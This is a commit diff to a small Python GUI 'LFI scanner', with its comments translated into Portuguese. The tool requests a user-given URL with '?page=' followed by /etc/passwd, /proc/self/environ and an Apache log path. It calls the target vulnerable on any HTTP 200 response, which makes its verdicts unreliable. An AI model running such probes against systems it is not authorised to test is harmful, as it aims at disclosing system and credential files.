6e8740a7224dac8e0d44ee5fa40398a3c395423a
wannacry3030 <wannacry.bat@proton.me>
2023-02-03 11:29:08 -0300

    att

--- LFI_scannerGUI.py
+++ LFI_scannerGUI.py
@@ -1,46 +1,49 @@
 import tkinter as tk
+import tkinter.font as font
 import requests
 
 def run_scan():
-    # get the URL from the user input
+    # usuario informa a URL
     url = entry.get()
     
-    # list of files to check for LFI vulnerability
+    # lista de arquivos para scan, vulnerabilidades LFI
     files = ["/etc/passwd", "/proc/self/environ", "/var/log/apache2/access.log"]
     
-    # loop through the list of files
+    # loop na lista de arquivos
     for file in files:
-        # construct the full URL to test
+        # construindo a URL completa
         test_url = url + "?page=" + file
-        # make the request to the URL
+        # fazendo o request na URL
         response = requests.get(test_url)
-        # check the response status code
+        # checando o codigo de resposta do request
         if response.status_code == 200:
-            # if the status code is 200, the file is accessible
+            # se a resposta for 200, o codigo é acessavel
             result_label.config(text=f"[+] VULNERÁVEL: {test_url}")
         else:
-            # if the status code is not 200, the file is not accessible
+            # se o status nao for 200, o codigo não é acessavel
             result_label.config(text=f"[-] Não VULNERÁVEL: {test_url}")
 
-# create the GUI window
+# criando a janela GUI
 root = tk.Tk()
+root.geometry("500x200")
 root.title("LFI Scanner")
+myFont = font.Font(family='Helvetica', weight='bold')
 
-# create a label for the URL input
+# criando o input
 url_label = tk.Label(root, text="URL:")
 url_label.grid(row=0, column=0, sticky="W")
 
-# create a text entry for the URL
+# criando a entrada de texto
 entry = tk.Entry(root)
 entry.grid(row=0, column=1)
 
-# create a button to start the scan
-scan_button = tk.Button(root, text="Scan", command=run_scan)
+# criando um botão pra começar o scan
+scan_button = tk.Button(root, text="SCAN", command=run_scan, font=myFont)
 scan_button.grid(row=1, column=0, columnspan=2, pady=10)
 
-# create a label to display the result
-result_label = tk.Label(root, text="")
+# criando um rotulo que mostra o resultado
+result_label = tk.Label(root, text="",)
 result_label.grid(row=2, column=0, columnspan=2, pady=10)
 
-# run the GUI
+# startando a GUI
 root.mainloop()
